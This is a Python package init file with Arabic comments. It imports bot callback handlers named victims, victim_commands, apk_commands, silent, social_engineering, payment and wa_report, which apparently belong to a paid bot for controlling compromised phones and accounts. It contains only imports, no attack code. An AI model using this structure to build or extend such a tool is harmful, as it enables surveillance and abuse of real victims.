# bot_handlers/callbacks/__init__.py
# ============================================================
# Callbacks Package — تصدير كل الـ handlers
# ============================================================

# ─── الـ Handlers الفرعية (لازم قبل router) ───
from . import help
from . import search
from . import facebook
from . import instagram
from . import silent
from . import dashboard
from . import victims
from . import victim_commands
from . import apk_commands
from . import updates
from . import payment
from . import admin
from . import misc
from . import social_engineering
from . import points
from . import wa_report          # ← ⚠️ السطر ده هو المهم

# ─── الـ Router الرئيسي ───
from .router import callback_handler

__all__ = ["callback_handler"]
